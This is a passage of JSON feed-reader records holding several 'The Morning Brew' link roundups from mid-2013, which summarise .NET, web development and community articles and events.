href=\"http://blogs.msdn.com/b/officeapps/archive/2013/06/26/office-developer-tools-for-visual-studio-2013-preview-released.aspx\">Office Developer Tools for Visual Studio 2013 Preview released!</a> - Xiaoying Guo highlights the release of the Office Developer Tools for Visual Studio 2013 preview, allowing you to continue developing office solutions when moving to Visual Studio 2013</li><li><a href=\"http://blogs.msdn.com/b/bingdevcenter/archive/2013/06/26/bing-developers-build.aspx\">Introducing The New Bing Developer Center and Services</a> - The Bing Developer Center also announced a number of new features for Windows 8 developers at //Build, with OCR (Optical Character Recognition) Services, Text to Speech, new Translation controls and improvements to mapping</li></ul><h3>Software</h3><ul><li><a href=\"http://blog.nuget.org/20130626/nuget-2.6-released.html\">NuGet 2.6 Released and Included in Visual Studio 2013 Preview</a> - The NuGet Team announce the release of NuGet 2.6, and its inclusion in the box for the Visual Studio 2013 Preview release.  As well as VS2013 compatibility this release includes the integration with the XDT transform engine for better configuration transformation, machine wide configuration, improved contextual search and better statistics tracking for packages, including breaking down direct installs and dependency installs.</li><li><a href=\"http://blogs.msdn.com/b/webdev/archive/2013/06/26/asp-net-updates-to-support-windows-azure-active-directory.aspx\">ASP.NET updates to support Windows Azure Active Directory - </a> - Sayed-Ibrahim-Hashimi highlights an update to the Visual Studio 2013 preview which adds ASP.NET support for the Windows Azure Active Directory within its authentication controls/libraries.</li></ul><h3>Information</h3><ul><li><a href=\"http://net.tutsplus.com/tutorials/javascript-ajax/advanced-unit-testing-techniques-in-javascript/\">Advanced Unit Testing Techniques in JavaScript</a> - Guido Kessels takes a look at the use of SinonJS and BusterJS to provide mocking, stubbing and testing capabilities to enable you to test JavaScript code in depth</li><li><a href=\"http://designcoderelease.blogspot.co.uk/2013/06/spa-authentication-in-net-world.html\">SPA Authentication in a .Net world</a> - Nathan Gloyn takes a look at Single Page Application Development, and specifically at the authentication options available for use in such applications</li><li><a href=\"http://magnusmartensson.com/quickly-swap-windows-azure-web-site-version-in-the-portal-with-zero-downtime\">Quickly swap Windows Azure Web Site version in the Portal with zero downtime</a> - Magnus Mårtensson has shared a series of short videos looking at the various aspects of deployment of Windows Azure Websites, including using the different Version Control based deployment options.  Check out the links in this post to the other videos in the series.</li><li><a href=\"http://www.daedtech.com/please-dont-recycle-local-variables\">Please Don’t Recycle Local Variables</a> - Erik Dietrich discusses the benefits of recycling in the real world, but urges you to not recycle variables in your code, helping you to move away from the bad old days of procedural code, and to help refactoring tools to operate correctly by not inter-relating unrelated concepts by sharing variables.</li><li><a href=\"http://geekswithblogs.net/TarunArora/archive/2013/06/27/upgrading-vsix-extensions-from-vs2012-to-vs2013.aspx\">Upgrading VSIX extensions from VS2012 to VS2013<br /></a> - Tarun Arora takes a look at the process to upgrade Visual Studio Extensions Projects to target Visual Studio 2013</li></ul><h3>Community</h3><ul><li><a href=\"https://www.innerworkings.com/promotions/09e866f5-af0e-407d-a036-030ce6af435a/lidnug-global-coding-contest\">LIDNUG Global Coding Contest</a> - InnerWorkings and LIDNUG have teamed up to run the LIDNUG Global Coding Contest, a challenge where you solve a variety of coding challenges using Visual Studio 2012 and Windows 8, and can win great prizes from a variety of .NET Tools vendors.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/-HQNJ9eaYDk\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1079}}
{"k":"0000000084","o":"0000004844","v":"001"}
{"_id":1080,"_uid":1080,"_dt":1373742620868,"_s":"c234cd8bb26f544ef4f3c7c1130956fc"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/sQd2_d2agb0/","title":"The Morning Brew #1381","published":{"$wrap":"$date","v":1371717086000,"h":"2013-06-20T08:31:26.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://blogs.msdn.com/b/interoperability/archive/2013/06/19/for-backbone-js-devs-easily-enable-new-cloud-based-experiences-in-your-apps-with-the-windows-azure-mobile-data-service.aspx\">For Backbone.js devs: easily enable new Cloud based experiences in your apps with the Windows Azure Mobile Data Service</a> - Olivier Bloch highlights the development by Microsoft Open Technologies of an open source Backbone adapter which makes it easy to synchronise data to a Windows Azure Data Services</li><li><a href=\"http://blogs.msdn.com/b/bharry/archive/2013/06/19/enterprise-grade-git.aspx\">Enterprise grade Git</a> - Brian Harry discusses the git support which is going to be front and centre of the Visual Studio 2013 / Team Foundation Server 2013 release, discussing some of the aims the team are addressing with the functionality.</li><li><a href=\"http://www.yuiblog.com/blog/2013/06/19/3-11pr1-released/\">3.11pr1 Released - YUI Blog</a> - The YUI team have release a preview release of YUI 3.11. This release sees some significant changes to Attribute and Base, and they are keen for developers to try out the functionality in existing applications to help them ensure that it all behaves as expected.</li></ul><h3>Information</h3><ul><li><a href=\"http://blogs.msdn.com/b/mssmallbiz/archive/2013/06/18/huge-collection-of-free-microsoft-ebooks-for-you-including-office-office-365-sharepoint-sql-server-system-center-visual-studio-web-development-windows-windows-azure-and-windows-server.aspx?Redirected=true\">Huge collection of Free Microsoft eBooks for you, including: Office, Office 365, SharePoint, SQL Server, System Center, Visual Studio, Web Development, Windows, Windows Azure, and Windows Server</a> - Eric Ligman follows on from the success last year and has updated his list of completely free Microsoft eBooks with all this years titles.  This list covers everything from Office 365 Windows Azure development, and is certain to contain something worth including in your summer reading.</li><li><a href=\"http://www.troyhunt.com/2013/06/dynamic-security-misconfiguration.html\">Dynamic security misconfiguration scanning with OnCheckin and ASafaWeb</a> - Troy Hunt discusses the importance of ongoing security checking and testing in your applications to ensure that your application continues to be as secure as it was when first developed, and discusses how his ASafaWeb tool has now been integrated with OnCheckin, a Cloud based deployment tool.</li><li><a href=\"http://blog.getglimpse.com/2013/06/19/next-up-for-hud/\">Next up for HUD? </a> - Anthony van der Hoorn discusses the feedback from the Glimpse Heads Up Display functionality and starts to look to the future, sharing some of the team’s thoughts on where to take this functionality, and asking for your feedback on the roadmap via a survey.</li><li><a href=\"http://www.codeproject.com/Articles/609053/AngleSharp\">AngleSharp</a> - Florian Rappl shares a detailed article on the use and development of AngleSharp, a library which provides DOM like API onto HTML and CSS content from C# code, going a few steps beyond the HTMLAgilityPack.</li><li><a href=\"http://blogs.msdn.com/b/dotnet/archive/2013/06/19/update-to-httpclient-and-automatic-decompression.aspx\">Update to HttpClient and Automatic Decompression</a> - Immo Landwerth announces the latest beta release of HttpClient which now supports automatic decompression across all platforms with the team having removed the dependency on the Microsoft.Bcl.Compression library which in turn depended on the native support for decompression.  This has been achieved by bringing the decompression code into HttpClient.</li><li><a href=\"http://www.codeproject.com/Tips/608902/Problems-with-XML-Serialization-and-NET-4-5\">Problems with XML Serialization and .NET 4.5</a> - Jim Lahey highlights some problems he encountered with XML Serialisation when running on .NET 4.5, but not on 4.0, and shows how a configuration setting allows you to control the implementation of the serializer used.</li></ul><h3>Community</h3><ul><li><a href=\"http://www.nxtgenug.net/ViewEvent.aspx?EventID=573\">NxtGenUG - Event: Windows Phone 8 WP8 </a> - The Hereford NxtGenUG are having a session on Windows Phone 8 development which will look at the platform, and explore some of the new features of the WP8 platform.  The event is on Monday 8th July.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/sQd2_d2agb0\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1080}}
{"k":"0000000084","o":"0000003804","v":"001"}
{"_id":1081,"_uid":1081,"_dt":1373742620868,"_s":"ffc56891fcebf19e454f2d11928761f4"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/7ZY5ZsM1-ZA/","title":"The Morning Brew #1392","published":{"$wrap":"$date","v":1373021841000,"h":"2013-07-05T10:57:21.000Z"},"starred":false,"read":false,"content":"<p>Closed the laptop too quickly again this morning, which meant it slept before it finished posting - still just about morning here though, so not a complete failure!</p><h3>Software</h3><ul><li><a href=\"http://blog.getglimpse.com/2013/07/04/glimpse-1-5-0-released/\">Glimpse 1.5.0 released</a> - The Glimpse Team announce their latest release, Glimpse 1.5.  This release includes improved configuration making it easier to turn options on and off within Glimpse, some improvements to layouts and linking between the HUD and Glimpse consoles</li><li><a href=\"http://blogs.msdn.com/b/bharry/archive/2013/07/04/team-explorer-everywhere-2012-update-available.aspx\">Team Explorer Everywhere 2012 Update available</a> - Brian Harry highlights the improvements to Team Explorer Everywhere which are shipped in the Update 3 , including support for TFS 2013 Preview, support for the latest version of Eclipse, improvements to file uploads and comparison</li><li><a href=\"http://www.codeproject.com/Tips/615997/CodeSHARPer-A-code-snippet\">CodeSHARPer: A code snippet</a> - Frederico Regateiro highlights CodeSHARPer, a simple C# editor which draws on a number of other open source projects to provide an good editor experience including syntax highlighting and auto complete, useful for those times when you don’t need the full Visual Studio.  The project is open source and available on CodePlex.</li></ul><h3>Information</h3><ul><li><a href=\"http://gunnarpeipman.com/2013/07/browser-link/\">Browser Link - Refresh running application in every browser on Visual Studio 2013</a> - Gunnar Peipman takes a look at another Visual Studio 2013 features, the browser link between the Visual Studio IDE and all the browsers running your site in the development environment, allowing one click in the IDE to refresh all the browsers.  This is an interesting use of SignalR to do the communication.</li><li><a href=\"http://weblogs.asp.net/ricardoperes/archive/2013/07/04/profiling-entity-framework-code-first-with-miniprofiler.aspx\">Profiling Entity Framework Code First With MiniProfiler</a> - Ricardo Peres takes a look at using the MiniProfiler to get a better understanding of what is going on with your Entity Framework Code First code, walking through its use in exploring the performance of your applications.</li><li><a href=\"http://www.codeproject.com/Articles/615395/The-Basics-of-ASP-NET-Performance-Optimization\">The Basics of ASP.NET Performance Optimization</a> - Tiago Pascoal discusses some key concepts in the optimisation of performance in ASP.NET Applications, looking at the use of profiling tools to identify problem areas</li><li><a href=\"http://www.codeproject.com/Articles/615948/Improve-site-load-and-cache-time\">Improve site load and cache time</a> - ‘NewAmbition’ takes a look at a number of techniques to improve the performance of your ASP.NET applications, including automatic image resizing and compression along with bundling and compression of JavaScript and CSS</li></ul><h3>Community</h3><ul><li><a href=\"http://codeofrob.com/entries/working-for-free-and-what-it-taught-me.html\">Working for free and what it taught me</a> - Rob Ashton shares some of the experiences of his time spent working for free across a range of countries, teams and programming languages, sharing some important lessons we should all take heed of.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/7ZY5ZsM1-ZA\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1081}}
{"k":"0000000084","o":"0000003523","v":"001"}
{"_id":1082,"_uid":1082,"_dt":1373742620868,"_s":"7c908938faf482d700048eafc0640e17"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/pnI_fL7sVA4/","title":"The Morning Brew #1384","published":{"$wrap":"$date","v":1372149080000,"h":"2013-06-25T08:31:20.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://blogs.msdn.com/b/ssdt/archive/2013/06/24/announcing-sql-server-data-tools-june-2013.aspx\">Announcing SQL Server Data Tools - June 2013</a> - Janet Yeilding announces the June 2013 release of the SQL Server Data Tools from the SQL Server Data Tools Team, a release which brings with it new features for comparing data as well as schema , new build actions and enhancements to the SQL Server Data-Tier Application Framework (DACFx),</li><li><a href=\"http://blogs.msdn.com/b/dotnet/archive/2013/06/24/please-welcome-immutablearray.aspx\">Please welcome ImmutableArray&lt;T&gt;</a> - Immo Landwerth announce a new addition to the immutable collections package, exploring its use, as well as discussing some of the improvements to value comparers and factory methods included in the updated package.</li><li><a href=\"http://www.jasonvolpe.com/microsoft-oracle-announce-partnership/\">Microsoft-Oracle Announce Partnership</a> - Jason Volpe highlights the news that Microsoft and Oracle have entered into a partnership to add official support for running Oracle software on Hyper-V and Windows Azure.</li></ul><h3>Information</h3><ul><li><a href=\"http://ericlippert.com/2013/06/24/string-concatenation-behind-the-scenes-part-two/?utm_source=rss&utm_medium=rss&utm_campaign=string-concatenation-behind-the-scenes-part-two\">String concatenation behind the scenes, part two</a> - Eric Lippert continues his look at the concatenation of strings in ,NET discussing in this part why the C# compiler does not convert string concatenation code to more efficient techniques for combining where the JScript.Net did</li><li><a href=\"http://haacked.com/archive/2013/06/24/platform-limitations-harm-net.aspx\">Platform Limitations Harm .NET</a> - Phil Haack discusses the complex and important issues of licensing, and specifically some of the restrictions about platform upon which some official Microsoft pacakges are licensed - very interesting reading, and something we should all care deeply about.</li><li><a href=\"http://www.daedtech.com/introduction-to-unit-testing-part-4-design-new-code-for-testability\">Introduction to Unit Testing Part 4: Design New Code For Testability</a> -  Erik Dietrich continues his series looking at unit testing with a look at the practice of writing new code to be unit testable  as a way of introducing testing practices into existing projects</li><li><a href=\"http://blogs.microsoft.co.il/blogs/sasha/archive/2013/06/23/node-js-and-windows-azure-a-love-story.aspx\">Node.js and Windows Azure: A Love Story</a> -  Sasha Goldshtein discusses how the Windows Azure platform makes a great place to work with Node.JS, looking at consuming some of the Azure services from Node.</li><li><a href=\"http://www.codeproject.com/Articles/607352/Injecting-Net-Assemblies-Into-Unmanaged-Processes\">Injecting .Net Assemblies Into Unmanaged Processes</a> - Pero Matić shares a project and looks at its use in injecting .NET code into unmanaged libraries - always interesting to know what goes on beneath the managed code</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/pnI_fL7sVA4\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1082}}
{"k":"0000000084","o":"0000004711","v":"001"}
{"_id":1083,"_uid":1083,"_dt":1373742620869,"_s":"76a6d58a057f935a19a1301318f0830b"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/Pkvus0PokRM/","title":"The Morning Brew #1395","published":{"$wrap":"$date","v":1373445300000,"h":"2013-07-10T08:35:00.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://blog.stevensanderson.com/2013/07/09/knockout-v2-3-0-released-v3-0-0-beta-available/\">Knockout v2.3.0 released; v3.0.0 beta available</a> - Steve Sanderson announces the release of Knockout 2.3.0, along with the beta release of Knockout 3.0.0.  The 2.x release brings performance and compatibility improvements along with bugfixes, and a couple of new features, and the 3.0 beta gives a taste of what is to come including substantial new binding features.</li><li><a href=\"http://blogs.msdn.com/b/specexplorer/archive/2013/07/09/spec-explorer-2010-release-3-5-3146-0-now-available.aspx\">Spec Explorer 2010 Release 3.5.3146.0 now available!</a> - The Spec Explorer team announce the release of Spec Explorer (2010) 3.5.3146.0 which brings with it support for Visual Studio 2012 in addition to 2010, multi-machine processing, model change detection and a new context menu.</li></ul><h3>Information</h3><ul><li><a href=\"http://tech.pro/tutorial/1317/c-performance-benchmark-mistakes-part-three\">C# Performance Benchmark Mistakes, Part Three</a> - The 3rd part of Eric Lippert’s series of Performance Benchmarking common mistakes is available now on Tech.pro.  In this post Eric discusses the significant difference in the first run of some code due to effects such as JIT compilation, and how performance in one environment does not equal performance in another.</li><li><a href=\"http://www.hanselman.com/blog/CrossPlatformPortableClassLibrariesWithNETAreHappening.aspx\">Cross-Platform Portable Class Libraries with .NET are Happening</a> - Scott Hanselman highlights recent developments for Portable Class Libraries, discussing how they are useful, looking at a number of the best portable libraries, and discussing how portable class libraries can go cross platform.</li><li><a href=\"http://haacked.com/archive/2013/07/09/the-lawyers-wont-let-us.aspx\">The Lawyers Won’t Let Us</a> - Phil Haack shares some thoughts on legal departments preventing alternative licensing of products, takes a look at the problem from a legal teams point of view (no change = no risk) and suggests that a good legal team should aim to make  things possible.</li><li><a href=\"http://odetocode.com/blogs/scott/archive/2013/07/09/getting-started-with-owin-katana-and-vs2013.aspx\">Getting Started With OWIN, Katana, and VS2013</a> - K. Scott Allen takes a short introductory look at OWIN (Open Web Interface in ,NET) and shows how and why its present in the new ASP.NET templates in Visual Studio 2013, illustrating with a simple example to serve web content from a console application.</li><li><a href=\"http://www.wintellect.com/blogs/jlikness/30-years-of-hello-world\">30 Years of Hello, World</a> - Jeremy Likness takes a look at the last 30 years of programming languages via the humble ‘Hello World’ program</li><li><a href=\"http://coding.smashingmagazine.com/2013/05/23/building-the-new-financial-times-web-app/\">Building The New Financial Times Web App (A Case Study)</a> - Wilson Page discusses some of the web development challenges they encountered while building the Financial Times web application, discussing how demanding briefs for the behaviour and appearance gave some opportunities to innovate on web standards.</li><li><a href=\"http://visualstudiomagazine.com/articles/2013/07/01/essential-knockout-js.aspx\">Essential Knockout.js</a> - Kelly Adams & Mark Michaelis gives a nice introduction to the key concepts and practices for development using Knockout.js in this Visual Studio Magazine article.</li></ul><h3>Community</h3><ul><li><a href=\"http://www.nxtgenug.net/ViewEvent.aspx?EventID=584\">NxtGenUG - Event: Functional Programming with F# </a> - The Birmingham NxtGenUG welcome Ian Russell for a session exploring functional programming using the F# language, giving an introduction to functional programming and setting you on course to enjoy the ability to solve complex problems with simple maintainable code.</li><li><a href=\"http://mikehadlow.blogspot.co.uk/2013/07/brighton-alt-net-brighton-digital.html\">Brighton ALT NET @ Brighton Digital Festival</a> - Mike Hadlow highlights the special Brighton Alt.NET event taking place as a part of the Brighton Digital Festival during September 2013.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/Pkvus0PokRM\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1083}}
{"k":"0000000084","o":"0000002448","v":"001"}
{"_id":1084,"_uid":1084,"_dt":1373742620869,"_s":"ec3a37fd8b566ad9cfcb24de5e1c90b0"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/TlKQIdtEfvc/","title":"The Morning Brew #1383","published":{"$wrap":"$date","v":1372062818000,"h":"2013-06-24T08:33:38.000Z"},"starred":false,"read":false,"content":"<p>Short Edition today, mostly due to bad traffic on my commute….</p><h3>Software</h3><ul><li><a href=\"http://coolthingoftheday.blogspot.co.uk/2013/06/a-sweet-summer-sysinternals-suite.html\">A Sweet Summer Sysinternals Suite Refresh</a> - Greg Duncan highlights the latest refresh of the whole SysInternals Suite of debugging and diagnostic tools - if these aren’t already in your toolset, they really should be</li></ul><h3>Information</h3><ul><li><a href=\"http://www.syncfusion.com/resources/techportal/ebooks/typescript\">TypeScript Succinctly</a> - Syncfusion have released another of the free (registration required) e-books in their Succinctly series.  This title from Steve Fenton takes a look at the TypeScript langauge</li><li><a href=\"http://msmvps.com/blogs/jon_skeet/archive/2013/06/22/array-covariance-not-just-ugly-but-slow-too.aspx\">Array covariance: not just ugly, but slow too</a> - Jon Skeet takes a look at array covariance, and shows how this is one area where the cleaner code options performs better than the more complex covariance.</li><li><a href=\"http://harriyott.com/2013/06/managing-the-development-process\">Managing the development process</a> - Simon Harriyott discusses his software development process, and how he manages his single developer / self developer projects for his clients.</li><li><a href=\"http://www.codeproject.com/Articles/610566/Understanding-Thread-s-Synchronization-Objects-wit\">Understanding Thread’s Synchronization Objects with a Real Life Example</a> - Priyank Purwar takes a dive into the various synchronisation types there are available in most programming lanauges, looking at their use and illustrating with exmaples.</li></ul><h3>Community</h3><ul><li><a href=\"http://www.udidahan.com/2013/06/21/the-ask-udi-podcast-is-back/\">The \"Ask Udi\" podcast is back</a> - Udi Dahan is resuming his ‘Ask Udi’ podcast series, and has resurrected the old episodes he is able to locate, and is looking for questions for future shows.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/TlKQIdtEfvc\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1084}}
{"k":"0000000084","o":"0000004512","v":"001"}
{"_id":1085,"_uid":1085,"_dt":1373742620869,"_s":"324370c38c99e9730c6d9aff5c8791b6"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/tKmHPadKD4Q/","title":"The Morning Brew #1389","published":{"$wrap":"$date","v":1372752139000,"h":"2013-07-02T08:02:19.000Z"},"starred":false,"read":false,"content":"<h3>Information</h3><ul><li><a href=\"http://www.troyhunt.com/2013/07/how-to-build-and-how-not-to-build.html\">Troy Hunt: How to build (and how not to build) a secure \"remember me\" feature</a> - Troy Hunt explores the patterns and anti-patterns of implementing the simple ‘Remember Me’ login feature, looking at how your implementation can go wrong.</li><li><a href=\"http://ericlippert.com/2013/07/01/a-string-concatenation-puzzle/\">A string concatenation puzzle</a> - Eric Lippert shares a simple but potentially surprising puzzle as a part of his look at string concatenation</li><li><a href=\"http://www.johnpapa.net/glimpse-for-toastr/\">Glimpse Extension for Toastr</a> - John Papa takes a look at Glimpse and its new Heads up display as well as sharing a Glimpse integration for his Toastr notifications library.</li><li><a href=\"https://www.simple-talk.com/dotnet/.net-framework/the-overhead-of-asyncawait-in-net-4.5/\">The overhead of async/await in NET 4.5</a> - Chris Hurley explores the under the covers implementation of Async / Await and discusses how the additional work that goes on can have performance implications.</li><li><a href=\"http://odetocode.com/blogs/scott/archive/2013/07/01/on-the-coexistence-of-asp-net-mvc-and-webapi.aspx\">On The Coexistence of ASP.NET MVC and WebAPI</a> - K Scott Allen discusses the most common question about ASP.NET MVC and ASP.NET Web API - whcih should you use and when, taking a look at the particular reasons and use cases for each.</li><li><a href=\"http://www.dotnetcurry.com/magazine/dnc-magazine-issue7.aspx\">DNC Magazine for .NET Developers - July 2013 Issue</a> - DotNet Curry Magazine hits its 1 year anniversary (And 7th edition) with articles on Pex, ASP.NET MVC extensibility, Sharepoint, Azure SQL DB Reporting, and much more</li><li><a href=\"http://msdn.microsoft.com/en-gb/magazine/default.aspx\">MSDN Magazine</a> - THe July Edition of MSDN Magazine is now available online with articles exploring Roslyn, MVVM development on Windows 8, mobile views on ASP.NET MVC and BDD using SpecFlow.</li><li><a href=\"http://www.west-wind.com/weblog/posts/2013/Jul/01/Using-HTML-5-SessionState-to-save-rendered-Page-Content\">Using HTML 5 SessionState to save rendered Page Content</a> - Rick Strahl takes a look at using Client Side storage to store the rendered HTML in SPA like applications  to provide improved performance and user experience.</li><li><a href=\"http://blogs.microsoft.co.il/blogs/sasha/archive/2013/07/01/capturing-dumps-of-windows-azure-web-sites.aspx\">Capturing Dumps of Windows Azure Web Sites</a> - Sasha Goldshtein highlights a new Windows Azure feature which allows you to easily obtain memory dumps of your Azure Wesbites just by hitting an endpoint in your browser.</li><li><a href=\"http://thenextweb.com/insider/2013/07/01/ie10-passes-ie9-in-market-share-firefox-falls-back-below-20-but-chrome-manages-to-gain-the-most/\">IE10 Passes IE9, Firefox Down but Chrome Up</a> - The Next Web shares the latest batch of browser market share stats, which show encouraging results for Internet Explorer 10, with it being the most popular edition of Internet Explorer in current use.</li></ul><h3>Community</h3><ul><li><a href=\"http://www.andrewwestgarth.co.uk/blog/post/2013/07/01/DDD-North-2013-Announced-and-Session-Submission-Open.aspx\">DDD North 2013 Announced and Session Submission Open</a> - Andrew Westgarth announces the plans for DDD North 2013 which will be taking place in Sunderland on Saturday 12th October 2013.  Organisation of the conference is progressing well, and the session submissions are now open, so if you fancy speaking at the conference, get an abstract submitted.</li><li><a href=\"http://blogs.msdn.com/b/mvpawardprogram/archive/2013/07/01/congratulations-to-the-new-amp-renewed-mvps.aspx\">Congratulations to the New & Renewed MVPs!</a> - Yesterday was the one of the MVP programme’s renewal / award day, and over 1000 Microsoft community folk were awarded or re-awarded, including a number of friends of the Brew.  Congratulations to all.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/tKmHPadKD4Q\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1085}}
{"k":"0000000084","o":"0000003176","v":"001"}
{"_id":1086,"_uid":1086,"_dt":1373742620870,"_s":"b7cbad5e1cc7fe095793746b593383a0"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/hPCIFcqZEIE/","title":"The Morning Brew #1379","published":{"$wrap":"$date","v":1371544477000,"h":"2013-06-18T08:34:37.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://coolthingoftheday.blogspot.co.uk/2013/06/log-parser-studio-20-now-out-log-parser.html\">Log Parser Studio 2.0 now out (Log Parser GUI++)</a> - Greg Duncan highlights the latest release of LogParser Studio, a GUI environment for working with the LogParser 2.2 which allows you to issue SQL like queries against a wide range of log file formats.</li></ul><h3>Information</h3><ul><li><a href=\"http://ericlippert.com/2013/06/17/string-concatenation-behind-the-scenes-part-one/\">String concatenation behind the scenes, part one</a> - Eric Lippert kicks off a new series of posts looking the art and science of string concatenation, looking at some of the optimisations he worked on that got included in the C# compiler.</li><li><a href=\"http://www.daedtech.com/dont-write-code-you-dont-need\">Don’t Write Code You Don’t Need</a> - Erik Dietrich shares some sage advice about writing too much code and exposing too much of your code to the consumers of that code, along with the perils of Mutability.</li><li><a href=\"http://haacked.com/archive/2013/06/17/hidden-code-mines.aspx\">Hidden Code Mines</a> - Phil Haack discusses a concept he is calling code mines, those bits of innocuous code which would get skipped over in a code review, but actually contain some subtle bug which will explode when you least expect.</li><li><a href=\"http://elegantcode.com/2013/06/17/3-pillars-of-pragmatic-agility/\">3 Pillars of Pragmatic Agility</a> - David Starr highlights his latest article for Visual Studio Magazine which proposes a new standard for agile software development which builds on the work of the last 12 years of being agile in a variety of forms.</li><li><a href=\"http://weblogs.asp.net/rchartier/archive/2013/06/16/agent-the-world-s-smartest-watch.aspx\">AGENT: The World’s Smartest Watch</a> - Rob Chartier takes a look at AGENT, the smart watch which is based upon the .NET Micro Framework with an API allowing .NET developer to leverage the power of a small write mounted device.</li></ul><h3>Community</h3><ul><li><a href=\"http://www.eventbrite.co.uk/event/6625136963/eorg#\">DareDevs: TDD, where did it all go wrong</a> - DareDevs (formerly Manchester / Warrington NxtGenUG) welcome Ian Cooper for a session on TDD, and how it has evolved since the original TDD rules,  this Wednesday evening (19 June)</li><li><a href=\"http://www.craftycoders.net/Events\">Events | CraftyCoders</a> - The Crafy Coders (Bromsgrove) have a sessions from Dan Kendall, Neil Barnwell and Jay McGuiness/James Morcom on Thursday 20th June 2013 where they will all be exploring Builds and Deployment.  Crafty Coders are also running a whole day (Saturday) Code Retreat on Saturday 31st August.</li></ul><img src=\"http://feeds.feedburner.com/~r/ReflectivePerspective/~4/hPCIFcqZEIE\" height=\"1\" width=\"1\"/>","author":"Chris Alcock","_id":{"$wrap":"$oid","v":1086}}
{"k":"0000000084","o":"0000004043","v":"001"}
{"_id":1087,"_uid":1087,"_dt":1373742620870,"_s":"af182bffc95d3fb0df9b84b2738fccae"}
{"subscription":{"$wrap":"$oid","v":43},"link":"http://feedproxy.google.com/~r/ReflectivePerspective/~3/yY_0JJKa0Wk/","title":"The Morning Brew #1380","published":{"$wrap":"$date","v":1371631311000,"h":"2013-06-19T08:41:51.000Z"},"starred":false,"read":false,"content":"<h3>Software</h3><ul><li><a href=\"http://blogs.msdn.com/b/typescript/archive/2013/06/18/announcing-typescript-0-9.aspx\">Announcing TypeScript 0.9 </a> & <a href=\"http://blogs.msdn.com/b/somasegar/archive/2013/06/17/typescript-0-9-preview-release.aspx\">TypeScript 0.9 Preview Release</a> - Jonathan Turner and Somasegar announce the release of the Preview Release of TypeScript 0.9.  This is a major step along the road the for the project, introducing a number of exciting new features including Generics support.</li><li><a href=\"http://haacked.com/archive/2013/06/18/semver-2-0-released.aspx\">SemVer 2.0 Released</a> - Phil Haack announce the release of the  SemVer 2.0.0 specification which details the correct formation of Semantic Version Numbers.  This specification release adds a number of clarifications and details of versioning build metadata.</li><li><a href=\"http://fortysix-and-two.blogspot.co.uk/2013/06/fscheck-09-released-and-moved-to-github.html\">FsCheck 0.9 Released and moved to GitHub</a> - Kurt Schelfthout announces the release of version 0.9 of FsCheck, along with the news that the project has been migrated to GitHub, to help aid collaboration, although that seems to be working well already as most of the changes in this release are community sourced.</li></ul><h3>Information</h3><ul><li><a href=\"http://lostechies.com/jimmybogard/2013/06/18/strategies-for-isolating-the-database-in-tests/\">Strategies for isolating the database in tests</a> - Jimmy Bogard discusses the importance of making tests independent of state, and looks at some strategies for working with the biggest form of state in tests, the database, from patterns such as database per developer, to the use of transactions to restore state to how it was.</li><li><a href=\"http://blogs.msdn.com/b/vcblog/archive/2013/06/18/deep-dive-into-nuget-native-part-one.aspx\">Deep Dive into NuGet Native (Part One)</a> - Garrett Serack takes us under the covers to look at how NuGet supports C/C++ packages and explores the construction of packages and their constituent parts.</li><li><a href=\"http://weblogs.asp.net/ricardoperes/archive/2013/06/18/nhibernate-conventions.aspx\">NHibernate Conventions</a> - Ricardo Peres takes a look at the use of conventions with NHibernate for the mapping of columns and tables and entities</li><li><a href=\"http://www.adamtibi.net/06-2013/five-essential-front-end-tools-that-should-be-used-with-modern-mvc-projects\">Five Essential Front-End Tools That Should be Used with Modern MVC Projects </a> - Adam Tibi takes a look at some useful libraries you should probably seriously consider including in your web frontend projects to make working with CSS and HTML5 easier.</li><li><a href=\"http://www.hanselman.com/blog/ExclusiveSneakPeakTheAGENTSmartWatchEmulatorAndManagedNETCodeOnMyWrist.aspx\">Exclusive Sneak Peak: The AGENT Smart Watch Emulator and managed .NET code on my wrist!</a> - Scott Hanselman gives us a glimpse of the AGENT smartwatch and the SDK that allows development of your own apps to run on the .NET Micro Framework based watch device.</li></ul><h3>Community</h3><ul><li><a href=\"http://www.irisclasson.com/2013/06/18/ug-tour-in-uk-this-week-and-next/\">UG Tour in UK this week and next</a> - Iris Classon is on a UK Usergroup Tour this week and next, giving sessions at usergroups in Bristol and Gloucestershire already, with the Telerik Developer Seminar today (Weds) in London,   Windows Phone UG London this evening, Dev South Coast in Southampton on Thursday evening and the Windows Store App developer group in London on Monday 24th.</li></ul><img 